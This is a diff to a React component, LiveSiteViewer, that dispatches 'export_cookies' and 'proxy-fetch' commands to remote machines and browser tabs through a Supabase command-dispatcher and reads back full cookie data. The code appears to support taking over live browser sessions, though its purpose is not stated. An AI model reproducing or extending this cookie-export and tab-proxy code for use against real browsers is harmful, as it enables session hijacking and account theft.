@@ -216,11 +216,12 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     console.log('[ExtensionProxy] Command created:', commandId);
     
     // 3. Send via dispatcher
+    console.log('[ExtensionProxy] Dispatching proxy-fetch with machine:', targetMachineId);
     const { data: dispatchData, error: dispatchError } = await supabase.functions.invoke('command-dispatcher', {
       body: {
         command_id: commandId,
         command_type: 'proxy-fetch',
-        target_machine_id: incident.machine_id,
+        target_machine_id: targetMachineId,
         target_tab_id: activeSession.tab_id,
         payload: {
           target_url: url,
@@ -484,15 +485,13 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
         const session = sessions[0];
         console.log('Active session found, requesting fresh cookies...');
         
-        // Get incident_id from incidents table
-        const { data: incidentData } = await supabase
-          .from('incidents')
-          .select('incident_id')
-          .eq('id', incident.id)
-          .single();
+        // Use exportIncidentId directly (avoid invalid query)
+        const exportIncidentId = incidentIdForProxy || incident.incident_id || (incident.id.startsWith('INC-') ? incident.id : null);
+        console.log('[LocalProxy] Using exportIncidentId:', exportIncidentId);
         
-        if (incidentData?.incident_id) {
+        if (exportIncidentId) {
           // Send export_cookies command
+          console.log('[LocalProxy] Sending export_cookies for incident:', exportIncidentId);
           await fetch(`https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/command-dispatcher`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -500,7 +499,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
               command_type: 'export_cookies',
               target_machine_id: session.machine_id,
               target_tab_id: session.tab_id,
-              payload: { incident_id: incidentData.incident_id }
+              payload: { incident_id: exportIncidentId }
             })
           });
 
@@ -511,7 +510,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
             const { data: updated } = await supabase
               .from('incidents')
               .select('full_cookie_data, cookie_excerpt')
-              .eq('incident_id', incidentData.incident_id)
+              .eq('incident_id', exportIncidentId)
               .single();
 
             const src = (updated as any)?.full_cookie_data ?? (updated as any)?.cookie_excerpt;
